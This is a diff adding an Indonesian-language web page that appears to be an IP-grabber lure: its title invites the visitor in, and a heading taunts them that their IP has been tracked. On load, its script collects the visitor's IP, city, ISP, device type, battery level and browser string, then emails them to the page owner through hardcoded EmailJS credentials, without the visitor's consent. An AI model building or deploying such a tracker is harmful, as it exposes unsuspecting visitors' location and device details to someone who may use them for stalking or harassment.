@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ALRECT masuk aja wak</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; }
+    .container { margin: 50px auto; max-width: 500px; padding: 20px; border: 3px solid #0f0; border-radius: 20px; background: rgba(0, 15, 0, 0.8); box-shadow: 0 0 40px #0f0; animation: pulse 2s infinite; }
+    h1 { font-family: 'Orbitron', sans-serif; font-size: 2.8em; text-shadow: 0 0 20px #0f0; margin-bottom: 20px; }
+    .info { background: #111; padding: 15px; margin: 15px 0; border-radius: 10px; border: 1px solid #0f0; text-align: left; }
+    .label { color: #0f0; font-weight: bold; }
+    .status { margin-top: 20px; font-size: 1.3em; color: #00ff00; display: none; animation: blink 1s infinite; }
+    @keyframes pulse { 0%, 100% { box-shadow: 0 0 40px #0f0; } 50% { box-shadow: 0 0 60px #0f0; } }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+    .scan { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, #0f0, transparent); animation: scan 3s linear infinite; }
+    @keyframes scan { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+  </style>
+</head>
+<body>
+
+  <div class="scan"></div>
+
+  <div class="container">
+    <h1>ALRECT SPY MODE - thank IP address lu dah gw lacak😹</h1>
+    <div class="info">
+      <p><span class="label">IP:</span> <span id="ip">Scanning...</span></p>
+      <p><span class="label">Kota:</span> <span id="kota">Detecting...</span></p>
+      <p><span class="label">Device:</span> <span id="device">Analyzing...</span></p>
+      <p><span class="label">Waktu:</span> <span id="waktu">-</span></p>
+      <p><span class="label">Baterai:</span> <span id="baterai">-</span></p>
+      <p><span class="label">ISP:</span> <span id="isp">Unknown</span></p>
+    </div>
+    <p class="status" id="status">NOTIFIKASI TERKIRIM!</p>
+  </div>
+
+  <script>
+    const SERVICE_ID = "service_tl5ltji";
+    const TEMPLATE_ID = "template_gssomff";
+    const PUBLIC_KEY = "vhyONd3rdiRCK2z3b";
+
+    emailjs.init({ publicKey: PUBLIC_KEY });
+
+    // Deteksi baterai (hanya di HP)
+    function getBattery() {
+      if ('getBattery' in navigator) {
+        navigator.getBattery().then(bat => {
+          document.getElementById('baterai').textContent = Math.round(bat.level * 100) + '%';
+        });
+      } else {
+        document.getElementById('baterai').textContent = 'Tidak tersedia';
+      }
+    }
+
+    window.onload = async () => {
+      try {
+        const res = await fetch('http://ip-api.com/json/?fields=query,city,regionName,country,isp,mobile');
+        const data = await res.json();
+
+        const info = {
+          ip: data.query || 'Unknown',
+          kota: data.city || 'Unknown',
+          device: data.mobile ? 'HP / Mobile' : 'PC / Laptop',
+          waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Makassar' }),
+          baterai: 'Loading...',
+          isp: data.isp || 'Unknown',
+          browser: navigator.userAgent.substring(0, 80)
+        };
+
+        // Update UI
+        document.getElementById('ip').textContent = info.ip;
+        document.getElementById('kota').textContent = info.kota;
+        document.getElementById('device').textContent = info.device;
+        document.getElementById('waktu').textContent = info.waktu;
+        document.getElementById('isp').textContent = info.isp;
+
+        // Cek baterai
+        getBattery();
+
+        // Kirim email
+        await emailjs.send(SERVICE_ID, TEMPLATE_ID, info);
+        document.getElementById('status').style.display = 'block';
+
+      } catch (err) {
+        alert("Gagal: " + (err.text || "Cek jaringan"));
+      }
+    };
+  </script>
+
+</body>
+</html>
